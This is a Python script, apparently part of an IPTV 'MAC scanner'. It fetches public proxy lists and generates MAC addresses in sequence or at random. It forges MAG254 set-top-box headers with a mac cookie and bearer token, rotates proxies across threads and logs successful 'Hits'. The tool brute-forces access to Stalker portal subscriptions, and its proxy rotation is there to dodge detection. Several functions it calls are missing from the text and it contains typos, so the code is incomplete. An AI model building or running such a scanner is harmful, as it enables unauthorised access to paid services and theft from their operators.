chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
print("\n\033[38;5;003m                   𝗖𝗛𝗢𝗢𝗦𝗘 𝗣𝗥𝗢𝗫𝗬          \33[0m")
def chooseit():

	b = '''
     |\033[38;5;002m1\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝙷𝚃𝚃𝙿\33[38;5;002m¹     \33[0m
     |\033[38;5;002m2\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝙷𝚃𝚃𝙿\33[38;5;002m²     \33[0m
     |\033[38;5;002m3\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝙷𝚃𝚃𝙿\33[38;5;002m³     \33[0m
     |\033[38;5;002m4\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝙷𝚃𝚃𝙿\33[38;5;002m⁴     \33[0m
     |\033[38;5;002m5\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝚂𝙾𝙲𝙺𝚂4\33[38;5;003m¹     \33[0m
     |\033[38;5;002m6\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝚂𝙾𝙲𝙺𝚂4\33[38;5;003m²     \33[0m
     |\033[38;5;002m7\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝚂𝙾𝙲𝙺𝚂5\33[38;5;196m¹     \33[0m
     |\033[38;5;002m8\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝚂𝙾𝙲𝙺𝚂5\33[38;5;196m²     \33[0m
     |\033[38;5;002m9\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝚄𝚂𝙰      \33[0m
     |\033[38;5;002m10\033[38;5;255m|\033[38;5;039m ➣ \033[38;5;255m 𝙲𝙰𝙽𝙰𝙳𝙰      \33[0m  
     |\033[38;5;002m11\033[38;5;255m|\033[38;5;039m ➣ \033[38;5;255m 𝙸𝚃𝙰𝙻𝚈      \33[0m  
     |\033[38;5;002m12\033[38;5;255m|\033[38;5;039m ➣ \033[38;5;255m 𝙵𝚁𝙰𝙽𝙲𝙴      \33[0m
     |\033[38;5;002m13\033[38;5;255m|\033[38;5;039m ➣ \033[38;5;255m 𝙶𝙴𝚁𝙼𝙰𝙽𝚈     \33[0m  
     |\033[38;5;002m14\033[38;5;255m|\033[38;5;039m ➣ \033[38;5;255m 𝙲𝙷𝙸𝙽𝙰      \33[0m
     |\033[38;5;002m0\033[38;5;255m|\033[38;5;039m ➣ \033[38;5;196m  𝗘𝗫𝗜𝗧  \33[0m    
  \n                 \033[38;5;039m𝗦𝗘𝗟𝗘𝗖𝗧 𝗡𝗨𝗠𝗕𝗘𝗥    		
\n\033[38;5;039m            ➣ \33[0m'''
	print(b,end = "")
	global c
	c = int(input())
	global d
	d = c
	gupt = str(c)
	guyt = len(gupt)
	if guyt >= int(2):
		if guyt ==1:
			d=int(c)
	return d
chooseit()
print('\n\n              \033[38;5;002m 𝙿𝚁𝙾𝚇𝙸𝙴𝚂 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙴𝙳 💚   ')
while d == "" :
	print('\n')
	dhechu = ('\033[93m Please enter a valid option and it must be a number!\nPRESS ANY KEY TO RESET)')
	print(dhechu,end = '')
	well = input()
	
	os.system('clear')
	banner()
	chooseit()
	continue
headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}

if d == int(1):
	url = "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt"
	htp = requests.get(url,headers = headers)
	print('\n')
	r = htp.text
	e = open(rootDir+'Proxy/HTTP¹.txt', 'w+')
	vu = e.write(r)
	e.close()
if d == int(2):
    url2 = "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt"
    htp2 = requests.get(url2,headers = headers)
    r2 = htp2.text
    e2 = open(rootDir+'Proxy/HTTP².txt', 'w+')
    vu2 = e2.write(r2)
    e2.close()
if d == int(3):
    url3 = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
    htp3 = requests.get(url3,headers = headers)
    r3 = htp3.text
    e3 = open(rootDir+'Proxy/HTTP³.txt', 'w+')
    vu3 = e3.write(r3)
    e3.close()
if d == int(4):
    url4 = "https://api.openproxylist.xyz/http.txt"
    htp4 = requests.get(url4,headers = headers)
    r4 = htp4.text
    e4 = open(rootDir+'Proxy/HTTP⁴.txt', 'w+')
    vu4 = e4.write(r4)
    e4.close()
if d == int(5):
    url5 = "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt"
    htp5 = requests.get(url5,headers = headers)
    r5 = htp5.text
    e5 = open(rootDir+'Proxy/SOCKS-4¹.txt', 'w+')
    vu5 = e5.write(r5)
    e5.close()
if d == int(6):
    url6 = "https://api.openproxylist.xyz/socks4.txt"
    htp6 = requests.get(url6,headers = headers)
    r6 = htp6.text
    e6 = open(rootDir+'Proxy/SOCKS-4².txt', 'w+')
    vu6 = e6.write(r6)
    e6.close()
if d == int(7):
    url7 = "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt"
    htp7 = requests.get(url7,headers = headers)
    r7 = htp7.text
    e7 = open(rootDir+'Proxy/SOCKS-5¹.txt', 'w+')
    vu7 = e7.write(r7)
    e7.close()
if d == int(8):
    url8 = "https://api.openproxylist.xyz/socks5.txt"
    htp8 = requests.get(url8,headers = headers)
    r8 = htp8.text
    e8 = open(rootDir+'Proxy/SOCKS-5².txt', 'w+')
    vu8 = e8.write(r8)
    e8.close()
if d == int(9):
	url9 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=750&country=US"
	htp9 = requests.get(url9,headers = headers)
	r9= htp9.text
	e9 = open(rootDir+'Proxy/USA.txt', 'w+')
	vu9 = e9.write(r9)
	e9.close()
if d == int(10):
    url10 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1000&country=CA"
    htp10 = requests.get(url10,headers = headers)
    r10 = htp10.text
    e10 = open(rootDir+'Proxy/CANADA.txt', 'w+')
    vu10 = e10write(r10)
    e10.close()
if d == int(11):
    url11 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1000&country=IT"
    htp11 = requests.get(url11,headers = headers)
    r11 = htp11.text
    e11 = open(rootDir+'Proxy/ITALY.txt', 'w+')
    vu11 = e11.write(r11)
    e11.close()
if d == int(12):
    url12 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1000&country=FR"
    htp12 = requests.get(url12,headers = headers)
    r12 = htp12.text
    e12 = open(rootDir+'Proxy/FRANCE.txt', 'w+')
    vu12 = e12.write(r12)
    e12.close()
if d == int(13):
    url13 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1500&country=DE"
    htp13 = requests.get(url13,headers = headers)
    r13 = htp13.text
    e13 = open(rootDir+'Proxy/GERMANY.txt', 'w+')
    vu13 = e13.write(r13)
    e13.close()
if d == int(14):
    url14 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1250&country=CN"
    htp14 = requests.get(url14,headers = headers)
    r14 = htp14.text
    e14 = open(rootDir+'Proxy/CHINA.txt', 'w+')
    vu14 = e14.write(r14)
    e14.close()
if d == int(0):
	exit

os.system('clear')
proxi=input("""\n\n\n\033[38;5;003m                   𝗖𝗛𝗢𝗢𝗦𝗘 𝗣𝗥𝗢𝗫𝗬          \33[0m\n
     |\033[38;5;002m1\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝚈𝙴𝚂    \33[0m
     |\033[38;5;002m2\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝙽𝙾    \33[0m
  \n                 \033[38;5;039m𝗦𝗘𝗟𝗘𝗖𝗧 𝗡𝗨𝗠𝗕𝗘𝗥    		
\n\033[38;5;039m            ➣ \33[0m""")

#print(Novel) 
if proxi =="1":
	dosyasec()
	pro=input("""
\n\033[38;5;003m              𝗖𝗛𝗢𝗢𝗦𝗘 𝗣𝗥𝗢𝗫𝗬 𝗧𝗬𝗣𝗘          \33[0m\n	
     |\033[38;5;002m1\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝙸𝙿𝚅𝚊𝚗𝚒𝚜𝚑    \33[0m
     |\033[38;5;002m2\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝚂𝚘𝚌𝚔𝚜4    \33[0m
     |\033[38;5;002m3\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝚂𝚘𝚌𝚔𝚜5    \33[0m
     |\033[38;5;002m4\033[38;5;255m|\033[38;5;039m  ➣ \033[38;5;255m 𝙷𝚃𝚃𝙿    \33[0m

  \n                 \033[38;5;039m𝗦𝗘𝗟𝗘𝗖𝗧 𝗡𝗨𝗠𝗕𝗘𝗥    		
\n\033[38;5;039m            ➣ \33[0m""")
print(proxyuz)
os.system('clear')
print(Novel)		
botgir=input("""\n\033[38;5;003m          𝗡𝗨𝗠𝗕𝗘𝗥 𝗢𝗙 𝗕𝗢𝗧𝗦 𝗧𝗢 𝗦𝗖𝗔𝗡    		
\n		
\033[38;5;039m            ➣ \33[0m""")
if botgir=="":
	botgir=1
print(Novel)
os.system('clear')

proxysay=0

import re
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"


k=0
jj=0
iii=0
genmacs=""
bib=0
import random
def randommac():
	global genmacs,combosay
	combosay=combosay+1
	global k,jj,iii
	if randomturu == '2':
		while True:
			genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
			if not genmac in genmacs:
				genmacs=genmacs + ' '
				break
	else:
		if iii >= 257:
			iii=0
			jj=jj+1
		if jj >= 257:
			if not len(seri)==2:
				jj=0
			k=k+1
			if len(seri)==2:
				quit()
		if k==257:
			quit()
		genmac = str(mactur)+"%02x:%02x:%02x"% (k,jj,iii)
		iii=iii+1
	if serim=="1":
	   if len(seri) ==1:
	   	genmac=str(genmac).replace(str(genmac[:10]),str(mactur)+seri)
	   if len(seri)==2:
	   	genmac=str(genmac).replace(str(genmac[:11]),str(mactur)+seri)
	genmac=genmac.replace(':100',':10')
	genmac=genmac.upper()
	return genmac

import sys

def hea1(panel,mac):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
	}
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
		}
		
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
			}

	return data
	
def hea2(mac,token):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
	}
	
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
		}
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
			}
		
	return data

def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')

from datetime import date
def tarih_clear(trh):
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	d = date(int(yil), int(ay), int(gun))
	sontrh = time.mktime(d.timetuple())
	out=(int((sontrh-time.time())/86400))
	return out
	
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import logging
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"

import os
if not os.path.isdir(rootDir+'/Hits/🇬🇷NOVEL/'):
   os.mkdir(rootDir+'/Hits/🇬🇷NOVEL/')

Dosyab=hits+"🇬🇷NOVEL("+dosyaadi+")("+nickn+").txt"
hitsay=0

dosyaadi="🇬🇷NOVEL"
say=1

ses=requests.Session()

combosay=0

combosay=0
def combogetir():
	combogeti=""
	global combosay
	combosay=combosay+1
	try:
		combogeti=(combototLen[combosay])
	except:pass
	return combogeti



def proxygetir():
	if proxi =="1":
		global proxysay,bib
		bib=bib+1
		bekle(bib,"Novel")
		if bib==15:
			bib=0
		while True:
			try:
				proxysay=proxysay+1
				if proxysay==proxyuz:
					proxysay=0
				
				proxygeti=(proxytotLen[proxysay])
				pveri=proxygeti.replace('\n','')
				
				pip=pveri.split(':')[0]
				pport=pveri.split(':')[1]
				
				if pro=="1":
					pname=pveri.split(':')[2]
					ppass=pveri.split(':')[3]
					proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
				if pro=="2":
					proxies={'http':'socks4://'+pip+':'+pport,'https':'socks4://'+pip+':'+pport}
				if pro=="3":
					proxies={'http':'socks5://'+pip+':'+pport,'https':'socks5://'+pip+':'+pport}
				if pro=="4":
					proxies={'http':'http://'+pip+':'+pport,'https':'https://'+pip+':'+pport}
				break
			except:pass
	else:
		proxies=""
	return proxies

import threading
for xdeep in range(int(botgir)):
	XDeep = threading.Thread(target=XD)
	XDeep.start()